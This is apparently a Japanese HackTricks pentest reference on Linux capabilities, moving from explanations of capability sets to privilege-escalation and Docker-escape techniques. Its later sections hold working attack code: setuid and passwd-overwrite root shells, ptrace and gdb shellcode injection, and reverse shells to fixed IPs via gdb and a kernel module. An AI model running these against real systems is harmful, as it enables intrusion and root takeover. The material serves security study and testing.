# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}


## Linux Capabilities

Linux capabilitiesは、**root権限をより小さく独立した単位に分割**し、プロセスに権限のサブセットを付与します。これにより、不要な場合に完全なroot権限を付与せず、リスクを最小限に抑えられます。<sup>[[5]](#references)</sup>

### 問題:

- 通常のユーザーは権限が制限されているため、rootアクセスを必要とするネットワークソケットのオープンなどのタスクに影響します。

### Capability Sets:

1. **Inherited (CapInh)**:

- **目的**: 親プロセスから引き継がれるcapabilitiesを決定します。
- **機能**: 新しいプロセスが作成されると、このsetに含まれるcapabilitiesを親から継承します。プロセスのspawn全体で特定の権限を維持する場合に役立ちます。
- **制限**: プロセスは、親プロセスが保有していなかったcapabilitiesを取得できません。<sup>[[3]](#references)</sup>

2. **Effective (CapEff)**:

- **目的**: プロセスがその時点で実際に使用しているcapabilitiesを表します。
- **機能**: さまざまな操作に対する権限を付与するためにkernelが確認するcapabilitiesのsetです。ファイルの場合、このsetは、ファイルのpermitted capabilitiesを有効なものとして扱うかどうかを示すflagになります。
- **重要性**: effective setは即時の権限チェックに不可欠であり、プロセスが使用できるcapabilitiesのactive setとして機能します。

3. **Permitted (CapPrm)**:

- **目的**: プロセスが保有できるcapabilitiesの最大setを定義します。
- **機能**: プロセスはpermitted setからcapabilityをeffective setへ昇格させ、そのcapabilityを使用できるようにできます。また、permitted setからcapabilitiesを削除することもできます。
- **境界**: プロセスが保有できるcapabilitiesの上限として機能し、定義済みの権限範囲を超えないようにします。

4. **Bounding (CapBnd)**:

- **目的**: プロセスがライフサイクル中に取得できるcapabilitiesに上限を設定します。
- **機能**: プロセスがinheritable setまたはpermitted setに特定のcapabilityを保有していても、それがbounding setにも含まれていない限り取得できません。
- **用途**: このsetは、プロセスのprivilege escalationの可能性を制限する場合に特に有用であり、セキュリティにさらなる層を追加します。

5. **Ambient (CapAmb)**:
- **目的**: 通常はプロセスのcapabilitiesが完全にresetされる`execve` system callの前後で、特定のcapabilitiesを維持できるようにします。
- **機能**: 関連付けられたfile capabilitiesを持たないnon-SUIDプログラムが、特定の権限を保持できるようにします。
- **制限**: このset内のcapabilitiesはinheritable setおよびpermitted setの制約を受けるため、プロセスに許可された権限を超えることはありません。<sup>[[8]](#references)[[9]](#references)</sup>
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
## Processes & Binaries Capabilities

### Processes Capabilities

特定の process の capabilities を確認するには、/proc directory 内の **status** file を使用します。より詳細な情報が提供されるため、Linux capabilities に関連する情報のみに限定します。\
すべての実行中の process では、capability information は thread ごとに保持され、file system 上の binaries では extended attributes に保存されることに注意してください。<sup>[[4]](#references)</sup>

capabilities は /usr/include/linux/capability.h で定義されています。

現在の process の capabilities は `cat /proc/self/status` または `capsh --print` で確認でき、他の users の capabilities は `/proc/<pid>/status` で確認できます。
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
このコマンドは、ほとんどのシステムで5行を返します。

- CapInh = 継承された capabilities
- CapPrm = 許可された capabilities
- CapEff = 有効な capabilities
- CapBnd = Bounding set
- CapAmb = Ambient capabilities set
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
これらの16進数は意味をなしません。capsh utilityを使用すると、capabilitiesの名前にデコードできます。
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
ここで、`ping` が使用する **capabilities** を確認してみましょう:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
それでも機能しますが、別のより簡単な方法があります。実行中の process の capabilities を確認するには、**getpcaps** tool の後にその process ID (PID) を指定します。process ID のリストを指定することもできます。
```bash
getpcaps 1234
```
ここでは、ネットワークを sniff するためにバイナリに十分な capabilities（`cap_net_admin` と `cap_net_raw`）を付与した後の `tcpdump` の capabilities を確認します（_tcpdump はプロセス 9562 で実行中です_）：
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
ご覧のとおり、指定された capabilities は、binary の capabilities を取得する2つの方法の結果に対応しています。\
_getpcaps_ tool は **capget()** system call を使用して、特定の thread で利用可能な capabilities を照会します。この system call では、より詳しい情報を取得するために PID を指定するだけで済みます。

### Binaries Capabilities

Binaries には、実行時に使用できる capabilities を設定できます。たとえば、`ping` binary に `cap_net_raw` capability が設定されていることは非常によくあります。
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
**capabilities が設定されたバイナリは、次の方法で検索できます：**
```bash
getcap -r / 2>/dev/null
```
### capsh による capabilities の削除

\_ping* から CAP*NET_RAW capabilities を削除すると、ping utility は動作しなくなるはずです。
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
_capsh_ 自体の出力に加えて、_tcpdump_ コマンド自体もエラーを発生させるはずです。

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

このエラーから、ping コマンドが ICMP socket を開くことを許可されていないことが明確にわかります。これで、想定どおりに動作していることを確実に確認できました。

### Capabilities の削除

バイナリの capabilities は、次のコマンドを使用して削除できます。
```bash
setcap -r </path/to/binary>
```
## User Capabilities

Apparently **ユーザーにもCapabilitiesを割り当てることが可能**です。これはおそらく、ユーザーが実行するすべてのプロセスで、そのユーザーのCapabilitiesを使用できることを意味します。\
[これ](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7)、[これ ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)、および[これ ](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user)によると、ユーザーに特定のCapabilitiesを付与するために設定が必要なファイルがいくつかありますが、各ユーザーにCapabilitiesを割り当てるファイルは`/etc/security/capability.conf`です。\
ファイルの例:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Environment Capabilities

以下のプログラムをコンパイルすると、**capabilitiesを提供する環境内でbash shellをspawn**できます。
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
**コンパイルされた ambient binary によって実行される bash の内部**では、**新しい capabilities**を確認できます（通常のユーザーは「current」セクションに capabilities を持ちません）。
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> **許可されたセットと継承可能なセットの両方に存在する capability のみ追加できます。**

### capability 対応/非対応バイナリ

**capability 対応バイナリは、環境から付与された新しい capability を使用しませんが、capability 非対応バイナリはそれらを拒否しないため使用**します。これにより、バイナリに capability を付与する特殊な環境内では、capability 非対応バイナリが脆弱になります。

## Service の capability

デフォルトでは、**root として実行される Service にはすべての capability が割り当てられます**。場合によっては、これが危険になる可能性があります。\
そのため、**Service configuration** ファイルでは、Service に付与する **capability** と、不要な権限で Service が実行されるのを防ぐために Service を実行すべき **user** を**指定**できます。
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Docker Container における Capabilities

デフォルトでは、Docker は container にいくつかの capabilities を割り当てます。どの capabilities かは、次を実行するだけで簡単に確認できます:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Capabilities は、**特権操作を実行した後に自身のプロセスを制限したい場合**（例: chroot を設定してソケットに bind した後）に便利です。しかし、悪意のある commands や arguments を渡すことで exploit され、それらが root として実行される可能性があります。<sup>[[2]](#references)</sup>

`setcap` を使用してプログラムに capabilities を強制的に付与し、`getcap` を使用してこれらを確認できます。
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` は capability を Effective および Permitted として追加することを意味します（「-」は削除を意味します）。

システムまたはフォルダ内で capabilities を持つプログラムを特定するには：
```bash
getcap -r / 2>/dev/null
```
### Exploitation example

以下の例では、バイナリ `/usr/bin/python2.6` に privesc の脆弱性があることが確認されています：
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
`tcpdump` が**すべてのユーザーによるパケットの sniff を許可するために**必要な **Capabilities**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "empty" capabilities の特殊なケース

[docs](https://man7.org/linux/man-pages/man7/capabilities.7.html) より: プログラムファイルに空の capability set を割り当てることが可能である点に注意してください。したがって、プログラムを実行するプロセスの effective および saved set-user-ID を 0 に変更するものの、そのプロセスには capabilities を一切付与しない set-user-ID-root プログラムを作成できます。つまり、次の条件を満たす binary がある場合:

1. root が所有者ではない
2. `SUID`/`SGID` ビットが設定されていない
3. capability set が空である（例: `getcap myelf` が `myelf =ep` を返す）

その場合、**その binary は root として実行されます**。

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** は非常に強力な Linux capability であり、device の mount や kernel 機能の操作など、広範な **administrative privileges** を持つため、ほぼ root レベルの権限とみなされることがよくあります。system 全体をシミュレートする container には不可欠ですが、**`CAP_SYS_ADMIN` には重大な security challenge があります**。特に containerized environment では、privilege escalation や system compromise につながる可能性があるためです。そのため、この capability の使用には厳格な security assessment と慎重な管理が必要です。**principle of least privilege** に従い attack surface を最小化するため、application-specific container ではこの capability を drop することが強く推奨されます。

**binary を使った例**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Pythonを使用すると、変更した _passwd_ ファイルを実際の _passwd_ ファイルの上にマウントできます。
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
そして最後に、変更した `passwd` ファイルを `/etc/passwd` に **mount** します:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
そして、パスワード「password」を使用して **`su` で root になる**ことができます。

**環境を使用した例（Docker breakout）**

以下を使用して、docker container 内で有効な capabilities を確認できます。
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
前の出力から、SYS_ADMIN capability が有効になっていることがわかります。

- **Mount**

これにより、docker container は **host disk を mount して自由にアクセス**できます：
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **フルアクセス**

前の方法では、docker host のディスクにアクセスすることに成功しました。\
host が **ssh** server を実行していることがわかった場合、**docker host** のディスク内に **user** を作成し、SSH 経由でアクセスできます：
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

**これは、host 内で実行されているプロセスに shellcode を inject することで、container から escape できることを意味します。host 内で実行されているプロセスにアクセスするには、container を少なくとも **`--pid=host`** 付きで実行する必要があります。**

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** は、`ptrace(2)` によって提供される debugging および system call tracing 機能、ならびに `process_vm_readv(2)` や `process_vm_writev(2)` のような cross-memory attach call を使用する権限を付与します。diagnostic や monitoring の目的では強力ですが、`ptrace(2)` に対する seccomp filter のような制限手段なしで `CAP_SYS_PTRACE` が有効になっていると、system security が大きく損なわれる可能性があります。具体的には、[このような proof of concept (PoC)](https://gist.github.com/thejh/8346f47e359adecd1d53) で実証されているように、seccomp によって課されたものを含む他の security restrictions を bypass するために悪用できます。<sup>[[10]](#references)</sup>

**binary (python) を使用した Example**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**バイナリを使った例（gdb）**

`ptrace` capabilityを持つ`gdb`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
msfvenomでshellcodeを作成して、gdb経由でメモリにinjectする
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
gdbでrootプロセスをデバッグし、前に生成したgdbの行をコピー＆ペーストします：
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**環境を使用した例（Docker breakout） - Another gdb Abuse**

**GDB** がインストールされている場合（例えば `apk add gdb` または `apt install gdb` でインストールできます）、**ホストから process を debug** して `system` function を呼び出させることができます。（この technique には `SYS_ADMIN` capability も必要です）**。**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
実行されたコマンドの出力を確認することはできませんが、そのプロセスによって実行されます（そのため、rev shell を取得します）。

> [!WARNING]
> エラー「No symbol "system" in current context.」が表示された場合は、gdb 経由でプログラムに shellcode を読み込む前の例を確認してください。

**environment を使用した例（Docker breakout） - Shellcode Injection**

以下を使用して、docker container 内で有効な capabilities を確認できます。
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
**ホスト**で実行中の**プロセス**を一覧表示します `ps -eaf`

1. **アーキテクチャ**を取得します `uname -m`
2. アーキテクチャ用の**shellcode**を探します ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. **shellcode**をプロセスのメモリに**inject**するための**プログラム**を探します ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. プログラム内の**shellcode**を**変更**して、**compile**します `gcc inject.c -o inject`
5. **inject**して**shell**を取得します: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** は、プロセスに**kernel modules（`init_module(2)`、`finit_module(2)`、`delete_module(2)` system calls）を load および unload する権限**を与え、kernel の中核操作への直接アクセスを可能にします。この capability は、kernel の変更によって privilege escalation やシステム全体の compromise を可能にし、Linux Security Modules や container isolation を含むすべての Linux security mechanisms を bypass できるため、重大な security risks をもたらします。<sup>[[6]](#references)</sup>
**つまり、ホストマシンの**kernel**に kernel modules を**insert/remove**できます。**

**binary を使用した例**

以下の例では、**`python`** binary にこの capability が付与されています。
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
デフォルトでは、**`modprobe`** command はディレクトリ **`/lib/modules/$(uname -r)`** 内の dependency list と map files を確認します。\
これを悪用するため、偽の **lib/modules** folder を作成します：
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
次に、**以下にある2つの例の kernel module を compile し、この folder にコピー**します:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
最後に、この kernel module をロードするために必要な Python code を実行します：
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**binaryを使った例2**

次の例では、binary **`kmod`** にこのcapabilityがあります。
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
つまり、**`insmod`** コマンドを使用して kernel module を挿入できます。以下の例に従い、この privilege を悪用して **reverse shell** を取得してください。

**Example with environment (Docker breakout)**

以下を使用すると、docker container 内で有効な capabilities を確認できます。
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
先ほどの出力から、**SYS_MODULE** capability が有効になっていることがわかります。

reverse shellを実行する**kernel module**と、それを**compile**するための**Makefile**を**作成**します:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Makefile 内の各 make 命令の前の空白文字は、スペースではなく**タブでなければなりません**！

`make` を実行してコンパイルします。
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
最後に、shell 内で `nc` を起動し、別の shell から **load the module** すると、nc process 内の shell を取得できます。
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**この technique の code は、** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)<sup>[[1]](#references)</sup>** の「Abusing SYS_MODULE Capability」laboratoryからコピーされました**

